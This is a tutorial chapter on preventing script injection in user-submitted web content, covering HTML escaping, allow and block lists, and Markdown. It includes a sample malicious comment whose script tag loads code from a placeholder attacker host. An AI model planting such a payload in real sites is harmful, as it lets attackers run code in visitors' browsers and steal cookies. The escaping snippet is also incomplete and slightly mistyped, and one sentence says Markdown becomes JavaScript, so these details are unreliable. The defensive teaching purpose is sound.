---
title: "Script Injection"
pre: "11. "
weight: 110
date: 2018-08-24T10:53:26-05:00
---

Whenever we render content created by users, we open the door to _script injection_, a kind of attack where a malicious user adds script tags to the content they are posting.  Consider this form:

```html
<form action="post">
   <label for="comment">
      <textarea name="comment"></textarea>
    </label>
    <input type="submit"/>
</form>
```

The intent is to allow the user to post comments on the page.  But a malicious user could enter something like:

```html
What an awesome site <script src="http://malic.ous/dangerous-script.js"></script>
```

If we concatenate this string directly into the webpage, we will serve the `<script>` tag the user included, which means that _dangerous-script.js_ will run on our page!  That means it can potentially access our site's cookies, and make AJAX requests from our site.  This script will run on the page for _all_ visitors!

This attack is known as [script injection](https://www.softwaretestinghelp.com/javascript-injection-tutorial/), and is something you **MUST** prevent. So how can we prevent it?  There are several strategies:

1. HTML Escaping
2. Block Lists
3. Allow Lists
4. Markdown or other Markup Languages

### HTML Escaping
The simplest is to "escape" html tags by replacing the `<` and `>` characters with their html code equivalents, `&lt;` (less than symbol) and `&gt;` (greater than symbol).  By replacing the opening and closing brackets with the equivalent HTML code, the browser will render the tags as ordinary strings, instead of as HTML.  Thus, the above example will render on the page as:

> What an awesome site &lt;script src="http://malic.ous/dangerous-script.js"&gt;&lt;/script&gt;

This can be accomplished in JavaScript with the [String.prototype.replace()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace) method:

```js
sanitizedHtmlString = htmlString.replace(/</g, '&lt;').replace(/>/g, '&gt');
```

The `replace()` method takes either a regular expression or string to search for - and a string to replace the occurrences with.  Here we use regular expressions with the global flag, so that _all_ occurrences will be replaced.  We also take advantage of the fact that it returns the modified string to do [method chaining](https://en.wikipedia.org/wiki/Method_chaining), invoking a second `replace()` call on the string returned from the first call.

The downside to this approach is that _all_ html in the string is reinterpreted as plain text.  This means our comments won't support HTML codes like `<b>` and `<i>`, limiting the ability of users to customize their responses.  

### Allow Lists 

Allow lists (also called "whitelists") are a technique to allow only certain tags to be embedded into the page.  This approach is more involved, as we must first _parse_ the HTML string the same way a browser would to determine what tags it contains, and then remove any tags that don't appear in our allow list.

Instead of writing your own code to do this, it is common practice to use a well-maintained and tested open-source library.  For example, the NPM package [sanitize-html](https://www.npmjs.com/package/sanitize-html) provides this ability.

### Block Lists 

Block lists (also called "blacklists") are a similar technique, but rather than specifying a list of _allowed_ tags, you specify a list of _disallowed_ tags.  These are then stripped from html strings.  This approach is slightly less robust, as new tags are added to the HTML standard will need to be evaluated and potentially added to the block list.

### Markdown or other Markup Languages

A final option is to have users write their contributions using Markdown or another markup language which is transformed _into_ JavaScript.  Markdown (used by GitHub and many other websites) is probably the best-known of these, and provides equivalents to bold, italic, headings, links, and images:

```md
# This is transformed into a h1 element 
## This is transformed into a h2 element
> This is transformed into a blockquote 
_this is italicized_ *as is this*
__this is bold__ **as is this**
* this
* is
* an 
* unordered 
* list
1. this
2. is 
3. a 
4. numbered
5. list
```

As it does not have conversions for `<script>` and other dangerous tags, HTML generated from it is relatively "safe" (it is still necessary to escape HTML in the original markup string though).

As with allow/block lists, Markdown and the like are usually processed with an outside library, like [markdown-js](https://www.npmjs.com/package/markdown).  There are similar libraries for most modern programming languages.